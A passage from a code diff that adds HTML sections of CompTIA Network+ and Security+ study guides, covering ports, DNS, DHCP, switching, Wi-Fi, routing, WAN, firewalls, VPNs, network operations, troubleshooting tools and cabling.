+<td>443</td>
+<td>HTTPS</td>
+<td>TCP</td>
+<td>Secure web</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB</td>
+<td>TCP</td>
+<td>File sharing (Windows)</td>
+</tr>
+<tr>
+<td>465</td>
+<td>SMTPS</td>
+<td>TCP</td>
+<td>Secure SMTP</td>
+</tr>
+<tr>
+<td>514</td>
+<td>Syslog</td>
+<td>UDP</td>
+<td>System logging</td>
+</tr>
+<tr>
+<td>587</td>
+<td>SMTP (submission)</td>
+<td>TCP</td>
+<td>Client to mail server</td>
+</tr>
+<tr>
+<td>636</td>
+<td>LDAPS</td>
+<td>TCP</td>
+<td>Secure LDAP</td>
+</tr>
+<tr>
+<td>993</td>
+<td>IMAPS</td>
+<td>TCP</td>
+<td>Secure IMAP</td>
+</tr>
+<tr>
+<td>995</td>
+<td>POP3S</td>
+<td>TCP</td>
+<td>Secure POP3</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MS SQL Server</td>
+<td>TCP</td>
+<td>Microsoft SQL Server</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle DB</td>
+<td>TCP</td>
+<td>Oracle database</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySQL</td>
+<td>TCP</td>
+<td>MySQL database</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>RDP</td>
+<td>TCP</td>
+<td>Remote Desktop Protocol</td>
+</tr>
+<tr>
+<td>5060/5061</td>
+<td>SIP</td>
+<td>TCP/UDP</td>
+<td>VoIP signaling</td>
+</tr>
+<tr>
+<td>5900</td>
+<td>VNC</td>
+<td>TCP</td>
+<td>Remote desktop (VNC)</td>
+</tr>
+<tr>
+<td>8080</td>
+<td>HTTP Alt</td>
+<td>TCP</td>
+<td>Alternate HTTP</td>
+</tr>
+<tr>
+<td>8443</td>
+<td>HTTPS Alt</td>
+<td>TCP</td>
+<td>Alternate HTTPS</td>
+</tr>
+</tbody>
+</table>
+<h3>TCP vs UDP</h3>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>TCP</th>
+<th>UDP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Connection</td>
+<td>Connection-oriented (3-way handshake)</td>
+<td>Connectionless</td>
+</tr>
+<tr>
+<td>Reliability</td>
+<td>Guaranteed delivery (ACK)</td>
+<td>Best-effort</td>
+</tr>
+<tr>
+<td>Order</td>
+<td>Maintains order</td>
+<td>No ordering</td>
+</tr>
+<tr>
+<td>Speed</td>
+<td>Slower</td>
+<td>Faster</td>
+</tr>
+<tr>
+<td>Error checking</td>
+<td>Yes</td>
+<td>Basic checksum</td>
+</tr>
+<tr>
+<td>Use cases</td>
+<td>HTTP, SSH, FTP, SMTP</td>
+<td>DNS, DHCP, streaming, gaming</td>
+</tr>
+</tbody>
+</table>
+<p><strong>TCP 3-Way Handshake:</strong> SYN → SYN-ACK → ACK (then data flows)<br/><strong>TCP Connection Close:</strong> FIN → ACK → FIN → ACK (4-step)</p>
+
+`,
+  "study-guide-networkplus-06": `
+<h2>6. DNS</h2>
+<ul>
+<li><strong>DNS (Domain Name System):</strong> Translates human-readable names to IP addresses</li>
+<li><strong>DNS hierarchy:</strong> Root → TLD (.com, .org) → Domain → Subdomain</li>
+</ul>
+<p><strong>DNS Record Types:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Record</th>
+<th>Purpose</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A</td>
+<td>Hostname → IPv4</td>
+<td>example.com → 93.184.216.34</td>
+</tr>
+<tr>
+<td>AAAA</td>
+<td>Hostname → IPv6</td>
+<td>example.com → 2606:2800::1</td>
+</tr>
+<tr>
+<td>CNAME</td>
+<td>Alias to another name</td>
+<td>www → example.com</td>
+</tr>
+<tr>
+<td>MX</td>
+<td>Mail server</td>
+<td>Priority + mail.example.com</td>
+</tr>
+<tr>
+<td>NS</td>
+<td>Authoritative name server</td>
+<td>ns1.example.com</td>
+</tr>
+<tr>
+<td>PTR</td>
+<td>Reverse DNS (IP → name)</td>
+<td>34.216.184.93.in-addr.arpa</td>
+</tr>
+<tr>
+<td>SOA</td>
+<td>Start of Authority</td>
+<td>Zone metadata</td>
+</tr>
+<tr>
+<td>TXT</td>
+<td>Text record</td>
+<td>SPF, DKIM, verification</td>
+</tr>
+<tr>
+<td>SRV</td>
+<td>Service location</td>
+<td>_sip._tcp.example.com</td>
+</tr>
+</tbody>
+</table>
+<p><strong>DNS Resolution Process:</strong></p>
+<ol>
+<li>Client queries local DNS cache</li>
+<li>If not cached, queries local DNS server (resolver)</li>
+<li>Resolver queries Root servers (.)</li>
+<li>Root refers to TLD name server (.com)</li>
+<li>TLD refers to authoritative name server</li>
+<li>Authoritative returns IP address</li>
+<li>Resolver caches and returns to client</li>
+</ol>
+
+`,
+  "study-guide-networkplus-07": `
+<h2>7. DHCP</h2>
+<p>DHCP (Dynamic Host Configuration Protocol) automatically assigns IP configuration.</p>
+<p><strong>DORA Process:</strong></p>
+<ol>
+<li><strong>Discover</strong> — Client broadcasts "I need an IP"</li>
+<li><strong>Offer</strong> — Server offers an IP address</li>
+<li><strong>Request</strong> — Client accepts the offer</li>
+<li><strong>Acknowledge</strong> — Server confirms the lease</li>
+</ol>
+<p><strong>DHCP provides:</strong> IP address, subnet mask, default gateway, DNS servers, lease time</p>
+<p><strong>DHCP Relay Agent:</strong> Forwards DHCP broadcasts across routers (since broadcasts don't cross routers normally).</p>
+
+`,
+  "study-guide-networkplus-08": `
+<h2>8. Network Devices Deep Dive</h2>
+<h3>Router</h3>
+<ul>
+<li>Operates at <strong>Layer 3</strong> (Network)</li>
+<li>Routes packets between networks using IP addresses</li>
+<li>Uses <strong>routing tables</strong> to determine best path</li>
+<li>Connects LAN to WAN (internet)</li>
+<li>NAT: translates private IPs to public</li>
+</ul>
+<h3>Switch</h3>
+<ul>
+<li>Operates at <strong>Layer 2</strong> (Data Link)</li>
+<li>Uses <strong>MAC address table</strong> to forward frames</li>
+<li>Each port = separate collision domain</li>
+<li>All ports = same broadcast domain (unless VLANs)</li>
+</ul>
+<p><strong>Switch operations:</strong></p>
+<ul>
+<li><strong>Learning:</strong> Records source MAC + port</li>
+<li><strong>Flooding:</strong> Unknown destination → send to all ports</li>
+<li><strong>Forwarding:</strong> Known destination → send to correct port</li>
+<li><strong>Filtering:</strong> Source = destination → don't forward</li>
+<li><strong>Aging:</strong> Remove stale MAC table entries</li>
+</ul>
+<h3>Layer 3 Switch</h3>
+<ul>
+<li>Combines switch + router functionality</li>
+<li>Routes between VLANs without a separate router</li>
+</ul>
+<h3>VLANs (Virtual LANs)</h3>
+<ul>
+<li>Logically segment a single switch into multiple networks</li>
+<li>Separate broadcast domains on same physical switch</li>
+<li><strong>Access port:</strong> Belongs to one VLAN (end devices)</li>
+<li><strong>Trunk port:</strong> Carries multiple VLANs (switch-to-switch, switch-to-router)</li>
+<li><strong>802.1Q tagging:</strong> VLAN tag added to frame on trunk links</li>
+</ul>
+<p><strong>Inter-VLAN routing:</strong> Router-on-a-stick (one router interface per VLAN) or Layer 3 switch</p>
+<h3>Spanning Tree Protocol (STP)</h3>
+<ul>
+<li>Prevents loops in redundant switched networks</li>
+<li><strong>802.1D STP:</strong> Root bridge election → ports become root, designated, or blocked</li>
+<li><strong>802.1w RSTP:</strong> Rapid STP, much faster convergence</li>
+<li><strong>PVST+:</strong> Per-VLAN STP (Cisco)</li>
+<li><strong>Port states:</strong> Blocking → Listening → Learning → Forwarding (STP)</li>
+<li>Root bridge: lowest Bridge ID (priority + MAC) wins</li>
+</ul>
+<h3>Access Point (AP)</h3>
+<ul>
+<li>Operates at <strong>Layer 2</strong></li>
+<li>Provides wireless connectivity</li>
+<li><strong>BSS:</strong> Basic Service Set — one AP + its clients</li>
+<li><strong>ESS:</strong> Extended Service Set — multiple APs, same SSID</li>
+</ul>
+
+`,
+  "study-guide-networkplus-09": `
+<h2>9. Wireless Networking</h2>
+<h3>Wi-Fi Standards</h3>
+<table>
+<thead>
+<tr>
+<th>Standard</th>
+<th>Max Speed</th>
+<th>Frequency</th>
+<th>Range</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>802.11a</td>
+<td>54 Mbps</td>
+<td>5 GHz</td>
+<td>Short</td>
+<td>Legacy</td>
+</tr>
+<tr>
+<td>802.11b</td>
+<td>11 Mbps</td>
+<td>2.4 GHz</td>
+<td>Long</td>
+<td>Legacy</td>
+</tr>
+<tr>
+<td>802.11g</td>
+<td>54 Mbps</td>
+<td>2.4 GHz</td>
+<td>Medium</td>
+<td>Legacy</td>
+</tr>
+<tr>
+<td>802.11n (Wi-Fi 4)</td>
+<td>600 Mbps</td>
+<td>2.4/5 GHz</td>
+<td>Good</td>
+<td>MIMO</td>
+</tr>
+<tr>
+<td>802.11ac (Wi-Fi 5)</td>
+<td>3.5 Gbps</td>
+<td>5 GHz</td>
+<td>Good</td>
+<td>MU-MIMO</td>
+</tr>
+<tr>
+<td>802.11ax (Wi-Fi 6)</td>
+<td>9.6 Gbps</td>
+<td>2.4/5 GHz</td>
+<td>Good</td>
+<td>OFDMA, WPA3</td>
+</tr>
+<tr>
+<td>802.11be (Wi-Fi 7)</td>
+<td>46 Gbps</td>
+<td>2.4/5/6 GHz</td>
+<td></td>
+<td>Multi-link</td>
+</tr>
+</tbody>
+</table>
+<p><strong>2.4 GHz vs 5 GHz:</strong></p>
+<ul>
+<li>2.4 GHz: Longer range, more interference, 3 non-overlapping channels</li>
+<li>5 GHz: Shorter range, less interference, more channels, faster speeds</li>
+</ul>
+<p><strong>Non-overlapping 2.4 GHz channels:</strong> 1, 6, 11</p>
+<h3>Wireless Security</h3>
+<table>
+<thead>
+<tr>
+<th>Protocol</th>
+<th>Security</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WEP</td>
+<td>Very weak</td>
+<td>Broken — don't use</td>
+</tr>
+<tr>
+<td>WPA</td>
+<td>Weak</td>
+<td>Uses TKIP — avoid</td>
+</tr>
+<tr>
+<td>WPA2</td>
+<td>Strong</td>
+<td>AES/CCMP — current standard</td>
+</tr>
+<tr>
+<td>WPA3</td>
+<td>Strongest</td>
+<td>SAE, forward secrecy, required for Wi-Fi 6</td>
+</tr>
+</tbody>
+</table>
+<p><strong>WPA2 modes:</strong></p>
+<ul>
+<li><strong>Personal (PSK):</strong> Pre-shared key (home/small business)</li>
+<li><strong>Enterprise:</strong> 802.1X authentication (RADIUS server)</li>
+</ul>
+<p><strong>Common wireless attacks:</strong></p>
+<ul>
+<li><strong>Evil twin:</strong> Fake AP mimicking legitimate one</li>
+<li><strong>Deauthentication attack:</strong> Force clients to disconnect</li>
+<li><strong>KRACK:</strong> Key reinstallation attack on WPA2</li>
+<li><strong>WPS brute force:</strong> Attack WPS PIN</li>
+</ul>
+
+`,
+  "study-guide-networkplus-10": `
+<h2>10. Routing</h2>
+<h3>Static vs Dynamic Routing</h3>
+<p><strong>Static:</strong> Manually configured routes. Reliable but doesn't adapt to failures.<br/><strong>Dynamic:</strong> Routes advertised automatically between routers using protocols.</p>
+<h3>Routing Protocols</h3>
+<table>
+<thead>
+<tr>
+<th>Protocol</th>
+<th>Type</th>
+<th>Algorithm</th>
+<th>Admin Distance</th>
+<th>Metric</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RIP</td>
+<td>Distance-vector</td>
+<td>Bellman-Ford</td>
+<td>120</td>
+<td>Hop count (max 15)</td>
+</tr>
+<tr>
+<td>OSPF</td>
+<td>Link-state</td>
+<td>Dijkstra</td>
+<td>110</td>
+<td>Cost (bandwidth)</td>
+</tr>
+<tr>
+<td>EIGRP</td>
+<td>Hybrid</td>
+<td>DUAL</td>
+<td>90 (internal)</td>
+<td>Bandwidth + delay</td>
+</tr>
+<tr>
+<td>BGP</td>
+<td>Path-vector</td>
+<td>Best-path</td>
+<td>20 (eBGP)</td>
+<td>AS-path + attributes</td>
+</tr>
+<tr>
+<td>ISIS</td>
+<td>Link-state</td>
+<td>Dijkstra</td>
+<td>115</td>
+<td>Cost</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Administrative Distance:</strong> Trustworthiness of route source (lower = more trusted)</p>
+<ul>
+<li>Connected: 0 | Static: 1 | EIGRP: 90 | OSPF: 110 | RIP: 120 | External: 170+</li>
+</ul>
+<p><strong>OSPF concepts:</strong></p>
+<ul>
+<li><strong>Router ID:</strong> Highest loopback IP or configured ID</li>
+<li><strong>DR/BDR:</strong> Designated/Backup Designated Router (on multi-access networks)</li>
+<li><strong>LSA:</strong> Link State Advertisement</li>
+<li><strong>LSDB:</strong> Link State Database</li>
+<li><strong>SPF tree:</strong> Shortest Path First calculation</li>
+</ul>
+<h3>NAT (Network Address Translation)</h3>
+<ul>
+<li><strong>Static NAT:</strong> One-to-one mapping</li>
+<li><strong>Dynamic NAT:</strong> Pool of public IPs, assigned as needed</li>
+<li><strong>PAT (Port Address Translation):</strong> Many-to-one; uses port numbers (most common — "NAT overload")</li>
+</ul>
+
+`,
+  "study-guide-networkplus-11": `
+<h2>11. WAN Technologies</h2>
+<table>
+<thead>
+<tr>
+<th>Technology</th>
+<th>Speed</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1</td>
+<td>1.544 Mbps</td>
+<td>Leased line, 24 DS0 channels</td>
+</tr>
+<tr>
+<td>T3</td>
+<td>44.736 Mbps</td>
+<td>28 T1 lines</td>
+</tr>
+<tr>
+<td>ADSL</td>
+<td>Up to 8 Mbps down</td>
+<td>Asymmetric DSL over phone line</td>
+</tr>
+<tr>
+<td>VDSL</td>
+<td>Up to 52 Mbps</td>
+<td>Very high DSL</td>
+</tr>
+<tr>
+<td>Cable</td>
+<td>Hundreds of Mbps</td>
+<td>DOCSIS over coax</td>
+</tr>
+<tr>
+<td>Fiber (FTTH)</td>
+<td>1+ Gbps</td>
+<td>Fiber to the home</td>
+</tr>
+<tr>
+<td>MPLS</td>
+<td>Varies</td>
+<td>Label-switched, QoS-friendly</td>
+</tr>
+<tr>
+<td>Metro Ethernet</td>
+<td>10 Mbps–10 Gbps</td>
+<td>Ethernet over WAN</td>
+</tr>
+<tr>
+<td>Satellite</td>
+<td>25–100 Mbps</td>
+<td>High latency (~600ms)</td>
+</tr>
+<tr>
+<td>Cellular (LTE/5G)</td>
+<td>Varies</td>
+<td>Mobile broadband</td>
+</tr>
+<tr>
+<td>SD-WAN</td>
+<td>Varies</td>
+<td>Software-defined WAN</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-networkplus-12": `
+<h2>12. Network Security</h2>
+<h3>Firewalls</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Inspection</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Packet filter</td>
+<td>Headers only</td>
+<td>Fast, basic</td>
+</tr>
+<tr>
+<td>Stateful</td>
+<td>Connection state</td>
+<td>Tracks sessions</td>
+</tr>
+<tr>
+<td>Application-layer</td>
+<td>Deep packet inspection</td>
+<td>Understands app protocols</td>
+</tr>
+<tr>
+<td>NGFW</td>
+<td>Everything + IPS, SSL inspection</td>
+<td>Modern standard</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Firewall rule order:</strong> Rules processed top-down; first match wins; implicit deny at end.</p>
+<h3>IDS vs IPS</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>IDS</th>
+<th>IPS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Placement</td>
+<td>Out-of-band (copy of traffic)</td>
+<td>Inline (all traffic passes through)</td>
+</tr>
+<tr>
+<td>Action</td>
+<td>Alerts only</td>
+<td>Alerts + blocks</td>
+</tr>
+<tr>
+<td>Failure mode</td>
+<td>Network still works</td>
+<td>Can cause downtime</td>
+</tr>
+<tr>
+<td>Response time</td>
+<td>Passive</td>
+<td>Active</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Detection methods:</strong></p>
+<ul>
+<li><strong>Signature-based:</strong> Matches known attack patterns; fast but misses new attacks</li>
+<li><strong>Anomaly-based:</strong> Compares to baseline; catches new attacks but false positives</li>
+<li><strong>Behavioral:</strong> Monitors behavior over time</li>
+</ul>
+<h3>AAA Framework</h3>
+<ul>
+<li><strong>Authentication:</strong> Who are you? (identity verification)</li>
+<li><strong>Authorization:</strong> What can you do? (access control)</li>
+<li><strong>Accounting:</strong> What did you do? (audit logging)</li>
+</ul>
+<p><strong>RADIUS vs TACACS+:</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>RADIUS</th>
+<th>TACACS+</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Protocol</td>
+<td>UDP 1812/1813</td>
+<td>TCP 49</td>
+</tr>
+<tr>
+<td>Encryption</td>
+<td>Password only</td>
+<td>All traffic</td>
+</tr>
+<tr>
+<td>AAA</td>
+<td>Combined</td>
+<td>Separated</td>
+</tr>
+<tr>
+<td>Vendor</td>
+<td>Open standard</td>
+<td>Cisco</td>
+</tr>
+<tr>
+<td>Use</td>
+<td>Network access</td>
+<td>Device administration</td>
+</tr>
+</tbody>
+</table>
+<h3>VPN Types</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Site-to-site</td>
+<td>Connects two networks (branch offices)</td>
+</tr>
+<tr>
+<td>Remote access</td>
+<td>Connects individual to corporate network</td>
+</tr>
+<tr>
+<td>SSL/TLS VPN</td>
+<td>Browser-based; no client software needed</td>
+</tr>
+<tr>
+<td>IPsec VPN</td>
+<td>Network-layer encryption; strong</td>
+</tr>
+<tr>
+<td>Split tunnel</td>
+<td>Only corporate traffic through VPN</td>
+</tr>
+<tr>
+<td>Full tunnel</td>
+<td>ALL traffic through VPN</td>
+</tr>
+</tbody>
+</table>
+<p><strong>IPsec components:</strong></p>
+<ul>
+<li><strong>IKE:</strong> Internet Key Exchange — negotiate security parameters</li>
+<li><strong>AH:</strong> Authentication Header — integrity only</li>
+<li><strong>ESP:</strong> Encapsulating Security Payload — encryption + integrity</li>
+<li><strong>Transport mode:</strong> Encrypts payload; original headers intact</li>
+<li><strong>Tunnel mode:</strong> Encrypts entire packet; new IP headers added</li>
+</ul>
+
+`,
+  "study-guide-networkplus-13": `
+<h2>13. Network Operations</h2>
+<h3>SNMP (Simple Network Management Protocol)</h3>
+<ul>
+<li>Monitors and manages network devices</li>
+<li><strong>Manager:</strong> NMS (Network Management System) — collects data</li>
+<li><strong>Agent:</strong> Software on managed device — reports data</li>
+<li><strong>MIB:</strong> Management Information Base — database of manageable objects</li>
+<li><strong>OID:</strong> Object Identifier — unique address of each MIB object</li>
+</ul>
+<p><strong>SNMP versions:</strong></p>
+<ul>
+<li>v1/v2c: Community strings (weak, plaintext)</li>
+<li>v3: Authentication + encryption (SHA, AES)</li>
+</ul>
+<p><strong>SNMP operations:</strong></p>
+<ul>
+<li><strong>Get:</strong> Manager requests data from agent</li>
+<li><strong>GetNext:</strong> Get next OID in tree</li>
+<li><strong>Set:</strong> Manager changes configuration on agent</li>
+<li><strong>Trap:</strong> Agent proactively sends alert to manager</li>
+<li><strong>Inform:</strong> Like trap but with acknowledgment</li>
+</ul>
+<h3>Syslog</h3>
+<ul>
+<li>Standard for sending log messages from devices</li>
+<li><strong>Ports:</strong> UDP 514, TCP 6514 (TLS)</li>
+<li><strong>Severity levels (0–7):</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Level</th>
+<th>Name</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>Emergency</td>
+<td>System unusable</td>
+</tr>
+<tr>
+<td>1</td>
+<td>Alert</td>
+<td>Immediate action needed</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Critical</td>
+<td>Critical conditions</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Error</td>
+<td>Error conditions</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Warning</td>
+<td>Warning conditions</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Notice</td>
+<td>Normal but significant</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Informational</td>
+<td>Informational messages</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Debug</td>
+<td>Debug-level messages</td>
+</tr>
+</tbody>
+</table>
+<h3>Network Time Protocol (NTP)</h3>
+<ul>
+<li>Synchronizes clocks across network</li>
+<li><strong>Port:</strong> UDP 123</li>
+<li><strong>Stratum:</strong> Distance from reference clock (stratum 0 = atomic clock)</li>
+<li>Stratum 1 = directly connected to stratum 0; stratum 2 = synced to stratum 1</li>
+</ul>
+<h3>Quality of Service (QoS)</h3>
+<ul>
+<li>Prioritizes certain traffic types</li>
+<li><strong>DSCP:</strong> Differentiated Services Code Point — marking in IP header</li>
+<li><strong>CoS:</strong> Class of Service — 802.1p marking in Ethernet frame</li>
+<li><strong>Traffic shaping:</strong> Smooths traffic bursts</li>
+<li><strong>Traffic policing:</strong> Drops/marks excess traffic</li>
+<li><strong>Queuing:</strong> Determines service order (FIFO, PQ, WFQ, CBWFQ)</li>
+</ul>
+<p><strong>Traffic categories by priority:</strong></p>
+<ol>
+<li>Voice (lowest latency, highest priority)</li>
+<li>Video</li>
+<li>Critical data</li>
+<li>Standard data</li>
+<li>Scavenger (lowest priority)</li>
+</ol>
+
+`,
+  "study-guide-networkplus-14": `
+<h2>14. Troubleshooting Tools</h2>
+<h3>Command-Line Tools</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>OS</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ping</code></td>
+<td>All</td>
+<td>Test reachability (ICMP echo)</td>
+</tr>
+<tr>
+<td><code>traceroute</code>/<code>tracert</code></td>
+<td>Linux/Windows</td>
+<td>Path to destination</td>
+</tr>
+<tr>
+<td><code>ipconfig</code></td>
+<td>Windows</td>
+<td>Show IP configuration</td>
+</tr>
+<tr>
+<td><code>ifconfig</code>/<code>ip addr</code></td>
+<td>Linux</td>
+<td>Show IP configuration</td>
+</tr>
+<tr>
+<td><code>nslookup</code>/<code>dig</code></td>
+<td>All</td>
+<td>DNS query</td>
+</tr>
+<tr>
+<td><code>netstat</code></td>
+<td>All</td>
+<td>Active connections and ports</td>
+</tr>
+<tr>
+<td><code>ss</code></td>
+<td>Linux</td>
+<td>Modern netstat</td>
+</tr>
+<tr>
+<td><code>arp -a</code></td>
+<td>All</td>
+<td>ARP cache</td>
+</tr>
+<tr>
+<td><code>route</code></td>
+<td>All</td>
+<td>Routing table</td>
+</tr>
+<tr>
+<td><code>nmap</code></td>
+<td>All</td>
+<td>Port scanning</td>
+</tr>
+<tr>
+<td><code>curl</code>/<code>wget</code></td>
+<td>Linux/Mac</td>
+<td>HTTP requests</td>
+</tr>
+<tr>
+<td><code>telnet</code></td>
+<td>All</td>
+<td>Test TCP port connectivity</td>
+</tr>
+<tr>
+<td><code>tcpdump</code></td>
+<td>Linux</td>
+<td>Packet capture</td>
+</tr>
+<tr>
+<td><code>Wireshark</code></td>
+<td>All</td>
+<td>GUI packet capture/analysis</td>
+</tr>
+<tr>
+<td><code>netsh</code></td>
+<td>Windows</td>
+<td>Network configuration</td>
+</tr>
+<tr>
+<td><code>pathping</code></td>
+<td>Windows</td>
+<td>Combines ping + tracert</td>
+</tr>
+<tr>
+<td><code>mtr</code></td>
+<td>Linux</td>
+<td>Like pathping</td>
+</tr>
+</tbody>
+</table>
+<h3>Troubleshooting Methodology</h3>
+<p><strong>CompTIA's 7-step process:</strong></p>
+<ol>
+<li>Identify the problem (gather information, symptoms)</li>
+<li>Establish a theory of probable cause</li>
+<li>Test the theory</li>
+<li>Establish a plan of action to resolve</li>
+<li>Implement the solution or escalate</li>
+<li>Verify full system functionality</li>
+<li>Document findings and outcomes</li>
+</ol>
+<p><strong>OSI Troubleshooting (bottom-up):</strong></p>
+<ol>
+<li>Physical — check cables, connectors, LEDs</li>
+<li>Data Link — check MAC, switch, VLAN</li>
+<li>Network — check IP, routing, NAT</li>
+<li>Transport — check ports, firewall, sessions</li>
+<li>Application — check app config, DNS, auth</li>
+</ol>
+
+`,
+  "study-guide-networkplus-15": `
+<h2>15. Cabling and Physical Layer</h2>
+<h3>Cable Types</h3>
+<table>
+<thead>
+<tr>
+<th>Cable</th>
+<th>Type</th>
+<th>Speed</th>
+<th>Max Distance</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cat5</td>
+<td>UTP</td>
+<td>100 Mbps</td>
+<td>100m</td>
+</tr>
+<tr>
+<td>Cat5e</td>
+<td>UTP</td>
+<td>1 Gbps</td>
+<td>100m</td>
+</tr>
+<tr>
+<td>Cat6</td>
+<td>UTP/STP</td>
+<td>1 Gbps (10G up to 55m)</td>
+<td>100m</td>
+</tr>
+<tr>
+<td>Cat6a</td>
+<td>UTP/STP</td>
+<td>10 Gbps</td>
+<td>100m</td>
+</tr>
+<tr>
+<td>Cat7</td>
+<td>STP</td>
+<td>10 Gbps</td>
+<td>100m</td>
+</tr>
+<tr>
+<td>Cat8</td>
+<td>STP</td>
+<td>25/40 Gbps</td>
+<td>30m</td>
+</tr>
+<tr>
+<td>Multimode Fiber</td>
+<td>Fiber</td>
+<td>Up to 100 Gbps</td>
+<td>up to 2km</td>
+</tr>
+<tr>
+<td>Single-mode Fiber</td>
+<td>Fiber</td>
+<td>Up to 100 Gbps</td>
+<td>Up to 100km</td>
+</tr>
+<tr>
+<td>Coaxial</td>
+<td>Copper</td>
+<td>Varies</td>
+<td>500m (thick)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>UTP wiring standards:</strong></p>
+<ul>
+<li><strong>T568A:</strong> Green-white, Green, Orange-white, Blue, Blue-white, Orange, Brown-white, Brown</li>
+<li><strong>T568B:</strong> Orange-white, Orange, Green-white, Blue, Blue-white, Green, Brown-white, Brown</li>
+</ul>
+<p><strong>Cable types:</strong></p>
+<ul>
+<li><strong>Straight-through:</strong> T568A to T568A or T568B to T568B — connects different devices (PC to switch)</li>
+<li><strong>Crossover:</strong> T568A to T568B — connects same device type (switch to switch, old)</li>
+<li><strong>Rollover:</strong> Cisco console cable</li>
+</ul>
+<p><strong>Fiber connectors:</strong> LC (most common), SC, ST, MPO, FC<br/><strong>Fiber issues:</strong> Bending radius, dirty connectors, attenuation, modal dispersion (multimode)</p>
+
+`,
+  "study-guide-networkplus-16": `
+<h2>16. Network+ Quick Reference</h2>
+<p><strong>Protocols to know by port (top priority):</strong><br/>22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 67/68 DHCP, 80 HTTP, 110 POP3, 143 IMAP, 389 LDAP, 443 HTTPS, 3389 RDP</p>
+<p><strong>OSI layers by PDU:</strong><br/>Layer 7/6/5 = Data | Layer 4 = Segment | Layer 3 = Packet | Layer 2 = Frame | Layer 1 = Bits</p>
+<p><strong>Subnetting hosts:</strong> 2ⁿ – 2 where n = number of host bits</p>
+<p><strong>IPv6 ::1</strong> = loopback | <strong>FE80::</strong> = link-local | <strong>FF00::</strong> = multicast</p>
+<p><strong>TCP 3-way handshake:</strong> SYN → SYN-ACK → ACK</p>
+<p><strong>DHCP DORA:</strong> Discover → Offer → Request → Acknowledge</p>
+<p><strong>Wireless channels non-overlapping (2.4 GHz):</strong> 1, 6, 11</p>
+
+<p><em>End of CompTIA Network+ Study Guide</em></p>
+
+`,
+  "study-guide-securityplus-01": `
+<h2>1. Exam Overview</h2>
+<p><strong>Exam Code:</strong> SY0-701<br/><strong>Questions:</strong> Maximum 90 (multiple-choice + performance-based)<br/><strong>Time Limit:</strong> 90 minutes<br/><strong>Passing Score:</strong> 750 (on a 100–900 scale)<br/><strong>Recommended Experience:</strong> Network+ and 2 years IT with security focus</p>
+<h3>Domain Breakdown</h3>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>Weight</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. General Security Concepts</td>
+<td>12%</td>
+</tr>
+<tr>
+<td>2. Threats, Vulnerabilities, and Mitigations</td>
+<td>22%</td>
+</tr>
+<tr>
+<td>3. Security Architecture</td>
+<td>18%</td>
+</tr>
+<tr>
+<td>4. Security Operations</td>
+<td>28%</td>
+</tr>
+<tr>
+<td>5. Security Program Management and Oversight</td>
+<td>20%</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-securityplus-02": `
+<h2>2. Domain 1: General Security Concepts</h2>
+<h3>Security Controls</h3>
+<p><strong>By Function:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Control Type</th>
+<th>Description</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Preventive</td>
+<td>Stop incidents before they occur</td>
+<td>Firewall, locks, training</td>
+</tr>
+<tr>
+<td>Deterrent</td>
+<td>Discourage attacks</td>
+<td>Cameras, warning signs, policy</td>
+</tr>
+<tr>
+<td>Detective</td>
+<td>Identify incidents</td>
+<td>IDS, SIEM, logs, cameras</td>
+</tr>
+<tr>
+<td>Corrective</td>
+<td>Restore after incident</td>
+<td>Backups, patches, incident response</td>
+</tr>
+<tr>
+<td>Compensating</td>
+<td>Alternative when primary impossible</td>
+<td>Increased monitoring</td>
+</tr>
+<tr>
+<td>Directive</td>
+<td>Direct behavior</td>
+<td>Policy, standards, procedures</td>
+</tr>
+</tbody>
+</table>
+<p><strong>By Category:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Technical</td>
+<td>Encryption, firewall, MFA, IDS, antivirus</td>
+</tr>
+<tr>
+<td>Managerial</td>
+<td>Risk assessments, policies, security reviews</td>
+</tr>
+<tr>
